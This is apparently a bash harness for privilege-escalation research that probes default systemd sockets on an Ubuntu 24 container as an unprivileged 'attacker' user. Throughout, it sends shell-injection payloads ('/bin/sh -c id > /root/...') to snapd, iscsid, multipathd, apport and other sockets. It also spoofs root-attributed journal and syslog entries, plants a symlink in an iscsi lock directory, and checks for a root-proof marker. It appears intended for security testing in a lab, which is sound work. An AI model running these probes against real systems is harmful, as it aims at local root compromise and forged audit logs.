#!/usr/bin/env bash
set -u

container="${1:-ubuntu24-server-lpe-target}"
repo_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
log_path="$repo_dir/logs/agent_default_socket_recheck.out"
tmp_log="$(mktemp "$repo_dir/logs/agent_default_socket_recheck.out.tmp.XXXXXX")"

finish() {
  mv "$tmp_log" "$log_path"
  printf '\nWrote %s\n' "$log_path"
}
trap finish EXIT

exec > >(tee "$tmp_log") 2>&1

printf 'repo=%s\ncontainer=%s\n' "$repo_dir" "$container"
docker ps --filter "name=$container" --format 'container={{.Names}} image={{.Image}} status={{.Status}}'

docker exec -i "$container" bash <<'TARGET'
set +e
export LC_ALL=C

section() {
  printf '\n### %s\n' "$*"
}

cmd() {
  printf '\n$'
  printf ' %q' "$@"
  printf '\n'
  "$@" 2>&1
  printf '[rc=%s]\n' "$?"
}

as_attacker() {
  printf '\n$ attacker: %s\n' "$*"
  runuser -u attacker -- bash -lc "$*" 2>&1
  printf '[attacker rc=%s]\n' "$?"
}

ROOT_MARKER=/root/agent_default_socket_recheck_root
TMP_MARKER=/tmp/agent_default_socket_recheck_root
WORK=/tmp/agent-default-socket-recheck
TOKEN="AGENT_DEFAULT_SOCKET_RECHECK_$(date +%s)_$$"

rm -rf "$WORK" "$TMP_MARKER" "$ROOT_MARKER" /tmp/agent-default-socket-recheck-* 2>/dev/null
mkdir -p "$WORK"

section "target baseline"
sed -n '1,8p' /etc/os-release
uname -a
cmd id attacker
cmd groups attacker
cmd systemctl is-system-running
dpkg-query -W -f='${binary:Package}\t${Version}\t${db:Status-Abbrev}\n' \
  apport apport-core-dump-handler python3-apport \
  dmeventd dmsetup lvm2 \
  lxd-installer snapd \
  multipath-tools open-iscsi libopeniscsiusr \
  systemd systemd-sysv udev rsyslog \
  util-linux uuid-runtime libuuid1 2>&1 | sort

section "default socket inventory"
cmd systemctl list-sockets --all --no-pager --plain
for unit in \
  multipathd.socket multipathd.service \
  iscsid.socket iscsid.service open-iscsi.service \
  dm-event.socket dm-event.service \
  lvm2-lvmpolld.socket lvm2-lvmpolld.service \
  apport-forward.socket 'apport-forward@.service' \
  systemd-fsckd.socket systemd-fsckd.service \
  systemd-pcrextend.socket systemd-pcrextend.service \
  systemd-sysext.socket systemd-sysext.service 'systemd-sysext@.service' \
  systemd-initctl.socket systemd-initctl.service \
  snapd.socket snapd.service \
  lxd-installer.socket 'lxd-installer@.service' \
  uuidd.socket uuidd.service \
  systemd-journald.socket systemd-journald-dev-log.socket systemd-journald.service \
  syslog.socket rsyslog.service; do
  echo "--- systemctl show $unit"
  systemctl show "$unit" -p Id -p LoadState -p ActiveState -p SubState -p UnitFileState \
    -p FragmentPath -p Triggers -p Listen -p SocketMode -p SocketUser -p SocketGroup \
    -p User -p Group -p ExecStart -p ConditionResult -p Conditions 2>&1
done

section "unit file line anchors"
for f in \
  /usr/lib/systemd/system/multipathd.socket /usr/lib/systemd/system/multipathd.service \
  /usr/lib/systemd/system/iscsid.socket /usr/lib/systemd/system/iscsid.service /usr/lib/systemd/system/open-iscsi.service \
  /usr/lib/systemd/system/dm-event.socket /usr/lib/systemd/system/dm-event.service \
  /usr/lib/systemd/system/lvm2-lvmpolld.socket /usr/lib/systemd/system/lvm2-lvmpolld.service \
  /usr/lib/systemd/system/apport-forward.socket /usr/lib/systemd/system/apport-forward@.service \
  /usr/lib/systemd/system/systemd-fsckd.socket \
  /usr/lib/systemd/system/systemd-pcrextend.socket \
  /usr/lib/systemd/system/systemd-sysext.socket \
  /usr/lib/systemd/system/systemd-initctl.socket /usr/lib/systemd/system/systemd-initctl.service \
  /usr/lib/systemd/system/snapd.socket \
  /usr/lib/systemd/system/lxd-installer.socket /usr/lib/systemd/system/lxd-installer@.service \
  /usr/lib/systemd/system/uuidd.socket /usr/lib/systemd/system/uuidd.service \
  /usr/lib/systemd/system/systemd-journald.socket /usr/lib/systemd/system/systemd-journald-dev-log.socket \
  /usr/lib/systemd/system/syslog.socket; do
  echo "--- $f"
  if [ -e "$f" ]; then
    nl -ba "$f" | sed -n '1,120p'
  else
    echo "MISSING $f"
  fi
done

section "runtime path modes"
for p in \
  /run/apport.socket \
  /run/dmeventd-client /run/dmeventd-server \
  /run/lvm /run/lvm/lvmpolld.socket \
  /run/lxd-installer.socket \
  /run/snapd.socket /run/snapd-snap.socket \
  /run/initctl /dev/initctl \
  /run/uuidd /run/uuidd/request /var/lib/libuuid /var/lib/libuuid/clock.txt \
  /run/systemd/fsck.progress /run/systemd/io.systemd.PCRExtend /run/systemd/io.systemd.sysext \
  /run/systemd/journal/socket /run/systemd/journal/stdout /run/systemd/journal/dev-log \
  /run/systemd/journal/syslog /dev/log /run/systemd/journal/io.systemd.journal \
  /run/multipath /etc/multipath.conf /etc/iscsi /etc/iscsi/iscsid.conf /etc/iscsi/initiatorname.iscsi \
  /run/lock /run/lock/iscsi; do
  if [ -e "$p" ] || [ -L "$p" ]; then
    stat -Lc '%A %a %U:%G %F %n -> %N' "$p" 2>&1
  else
    echo "MISSING $p"
  fi
done
echo "--- /proc/net/unix filtered"
awk 'NR==1 || /multipathd|ISCSIADM|apport|dmeventd|lvmpolld|lxd-installer|snapd|initctl|uuidd|fsck|PCRExtend|sysext|journal|dev-log|syslog/ {print}' /proc/net/unix

section "generic pathname socket reachability from attacker"
runuser -u attacker -- python3 - "$TOKEN" "$ROOT_MARKER" <<'PY'
import os
import socket
import sys
token, root_marker = sys.argv[1], sys.argv[2]
payload = (f"{token}; /bin/sh -c 'id > {root_marker}'\n").encode()
stream_paths = [
    "/run/apport.socket",
    "/run/lvm/lvmpolld.socket",
    "/run/lxd-installer.socket",
    "/run/snapd.socket",
    "/run/snapd-snap.socket",
    "/run/initctl",
    "/dev/initctl",
    "/run/uuidd/request",
    "/run/systemd/fsck.progress",
    "/run/systemd/io.systemd.PCRExtend",
    "/run/systemd/io.systemd.sysext",
    "/run/systemd/journal/stdout",
]
for path in stream_paths:
    print(f"-- STREAM {path}")
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.settimeout(1.5)
    try:
        s.connect(path)
        print("connect=ok")
        try:
            s.sendall(payload)
            print(f"send={len(payload)}")
        except OSError as e:
            print(f"send_error={e.errno}:{e.strerror}")
        try:
            data = s.recv(160)
            print(f"recv_len={len(data)} recv={data[:120]!r}")
        except Exception as e:
            print(f"recv_error={type(e).__name__}:{e}")
    except OSError as e:
        print(f"connect_error={e.errno}:{e.strerror}")
    finally:
        s.close()
PY
printf '[attacker python rc=%s]\n' "$?"

section "generic datagram journal/syslog reachability from attacker"
runuser -u attacker -- python3 - "$TOKEN" "$ROOT_MARKER" <<'PY'
import socket
import sys
token, root_marker = sys.argv[1], sys.argv[2]
paths = [
    "/run/systemd/journal/socket",
    "/run/systemd/journal/dev-log",
    "/dev/log",
    "/run/systemd/journal/syslog",
]
payloads = [
    (f"MESSAGE={token} native _UID=0 _PID=1 marker={root_marker}\n"
     "PRIORITY=2\nSYSLOG_IDENTIFIER=root\n_UID=0\n_PID=1\n_COMM=systemd\n").encode(),
    (f"<13>root[{token}]: syslog spoof marker={root_marker}").encode(),
]
for path in paths:
    print(f"-- DGRAM {path}")
    for idx, payload in enumerate(payloads):
        s = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        s.settimeout(1.0)
        try:
            s.sendto(payload, path)
            print(f"sendto[{idx}]=ok len={len(payload)}")
        except OSError as e:
            print(f"sendto[{idx}]_error={e.errno}:{e.strerror}")
        finally:
            s.close()
PY
printf '[attacker python rc=%s]\n' "$?"

section "abstract socket recheck: iscsid and multipathd"
rm -rf /run/lock/iscsi /tmp/agent-default-socket-recheck-iscsi-lock-created 2>/dev/null
as_attacker "mkdir -p /run/lock/iscsi && ln -s '$ROOT_MARKER' /run/lock/iscsi/lock && ls -ld /run/lock/iscsi && ls -l /run/lock/iscsi/lock"
runuser -u attacker -- python3 - "$TOKEN" "$ROOT_MARKER" <<'PY'
import socket
import sys
token, root_marker = sys.argv[1], sys.argv[2]
tests = [
    ("iscsid", "\0ISCSIADM_ABSTRACT_NAMESPACE", [
        b"\0" * 128,
        (f"{token}; /bin/sh -c 'id > {root_marker}'\n").encode(),
    ]),
    ("multipathd", "\0/org/kernel/linux/storage/multipathd", [
        b"show daemon\n",
        b"show config\n",
        b"list paths\n",
        b"reconfigure\n",
        (f"reconfigure ; /bin/sh -c 'id > {root_marker}'\n").encode(),
    ]),
]
for name, addr, payloads in tests:
    for payload in payloads:
        print(f"-- ABSTRACT {name} payload_len={len(payload)}")
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(2.0)
        try:
            s.connect(addr)
            print("connect=ok")
            s.sendall(payload)
            print("send=ok")
            try:
                data = s.recv(4096)
                print(f"recv_len={len(data)} recv={data[:300]!r}")
            except Exception as e:
                print(f"recv_error={type(e).__name__}:{e}")
        except OSError as e:
            print(f"connect_or_send_error={e.errno}:{e.strerror}")
        finally:
            s.close()
PY
printf '[attacker python rc=%s]\n' "$?"
cmd journalctl -u iscsid.service -u iscsid.socket -n 30 --no-pager
as_attacker "iscsiadm -m node"
as_attacker "iscsiadm -m discoverydb -t sendtargets -p 127.0.0.1:3260 --op new"
as_attacker "iscsiadm -m discovery -t sendtargets -p 127.0.0.1:3260"
as_attacker "multipath -ll"
as_attacker "timeout 3 multipathd -k'show daemon'"
as_attacker "timeout 3 multipathd -k'reconfigure'"

section "dm-event and lvmpolld client commands"
as_attacker "printf '$TOKEN $ROOT_MARKER\n' > /run/dmeventd-client"
as_attacker "printf '$TOKEN $ROOT_MARKER\n' > /run/dmeventd-server"
as_attacker "timeout 2 cat /run/dmeventd-client >/tmp/agent-default-socket-recheck-dmeventd-client"
as_attacker "timeout 2 cat /run/dmeventd-server >/tmp/agent-default-socket-recheck-dmeventd-server"
as_attacker "lvm version"
as_attacker "pvscan --cache"
as_attacker "lvs"
as_attacker "lvm fullreport --config 'global { use_lvmpolld=1 }'"
as_attacker "dmsetup version"

section "apport, fsckd, pcrextend, sysext, initctl"
as_attacker "python3 - <<'PY'
import socket
for path in ['/run/apport.socket','/run/systemd/fsck.progress','/run/systemd/io.systemd.PCRExtend','/run/systemd/io.systemd.sysext']:
    s=socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.settimeout(1.0)
    try:
        s.connect(path)
        print(path, 'connect_ok')
        s.sendall(b'$TOKEN $ROOT_MARKER\n')
    except OSError as e:
        print(path, 'error', e.errno, e.strerror)
    finally:
        s.close()
PY"
as_attacker "printf '$TOKEN $ROOT_MARKER\n' >/run/initctl"
as_attacker "printf '$TOKEN $ROOT_MARKER\n' >/dev/initctl"
as_attacker "telinit q"
as_attacker "telinit 3"
as_attacker "systemctl start systemd-fsckd.socket systemd-pcrextend.socket"
as_attacker "varlinkctl info /run/systemd/io.systemd.sysext"
as_attacker "systemd-sysext list"
as_attacker "systemd-sysext merge"

section "snapd and lxd-installer privilege gates"
as_attacker "curl --max-time 5 --silent --show-error --unix-socket /run/snapd.socket -i http://localhost/v2/system-info | sed -n '1,18p'"
as_attacker "curl --max-time 5 --silent --show-error --unix-socket /run/snapd.socket -i -H 'Content-Type: application/json' -X POST --data '{\"action\":\"install\",\"snaps\":[\"agent-default-socket-recheck\"],\"marker\":\"$ROOT_MARKER\"}' http://localhost/v2/snaps | sed -n '1,24p'"
as_attacker "curl --max-time 5 --silent --show-error --unix-socket /run/snapd.socket -i -H 'Content-Type: application/json' -X POST --data '{\"action\":\"start\",\"names\":[\"agent-default-socket-recheck.service\"],\"scope\":[\"system\"],\"marker\":\"$ROOT_MARKER\"}' http://localhost/v2/apps | sed -n '1,24p'"
as_attacker "curl --max-time 5 --silent --show-error --unix-socket /run/snapd-snap.socket -i http://localhost/v2/system-info | sed -n '1,18p'"
as_attacker "/sbin/lxc version"
as_attacker "python3 - <<'PY'
import socket
path='/run/lxd-installer.socket'
s=socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
try:
    s.connect(path)
    print('lxd-installer connect_ok')
    s.sendall(b'$TOKEN $ROOT_MARKER\n')
    print('recv', s.recv(32))
except OSError as e:
    print('lxd-installer error', e.errno, e.strerror)
finally:
    s.close()
PY"

section "uuidd service account boundary"
as_attacker "/usr/sbin/uuidd --time --uuids 2"
as_attacker "/usr/sbin/uuidd --random --uuids 2"
as_attacker "rm -f /run/uuidd/request"
cmd ps -eo user:18,uid,gid,pid,ppid,comm,args
cmd stat -Lc '%A %a %U:%G %F %n' /var/lib/libuuid /var/lib/libuuid/clock.txt

section "journal attribution for spoof attempts"
sleep 1
journalctl -n 250 -o verbose --no-pager | sed -n "/$TOKEN/,+35p"

section "root marker and cleanup"
for p in "$ROOT_MARKER" "$TMP_MARKER" /tmp/agent-default-socket-recheck-dmeventd-client /tmp/agent-default-socket-recheck-dmeventd-server /tmp/agent-default-socket-recheck-iscsi-lock-created; do
  if [ -e "$p" ] || [ -L "$p" ]; then
    echo "MARKER_OR_ARTIFACT_PRESENT $p"
    ls -la "$p" 2>&1
    [ -f "$p" ] && sed -n '1,20p' "$p" 2>&1
  else
    echo "absent $p"
  fi
done
if [ -e "$ROOT_MARKER" ]; then
  echo "ROOT_PROOF=YES"
  cat "$ROOT_MARKER" 2>/dev/null
else
  echo "ROOT_PROOF=NO"
fi

rm -rf "$WORK" "$TMP_MARKER" /tmp/agent-default-socket-recheck-* \
  /tmp/agent-default-socket-recheck-dmeventd-client \
  /tmp/agent-default-socket-recheck-dmeventd-server 2>/dev/null
rm -rf /run/lock/iscsi 2>/dev/null
rm -f "$ROOT_MARKER" 2>/dev/null
systemctl reset-failed iscsid.service iscsid.socket multipathd.service multipathd.socket \
  dm-event.service dm-event.socket lvm2-lvmpolld.service lvm2-lvmpolld.socket \
  apport-forward.socket systemd-fsckd.socket systemd-pcrextend.socket \
  systemd-sysext.socket systemd-initctl.socket snapd.service snapd.socket \
  lxd-installer.socket uuidd.service uuidd.socket rsyslog.service syslog.socket 2>/dev/null || true
systemctl start iscsid.socket dm-event.socket lvm2-lvmpolld.socket apport-forward.socket \
  systemd-sysext.socket systemd-initctl.socket snapd.socket lxd-installer.socket \
  uuidd.socket syslog.socket 2>/dev/null || true
cmd systemctl is-system-running
cmd systemctl --failed --no-legend
cmd losetup -a
TARGET
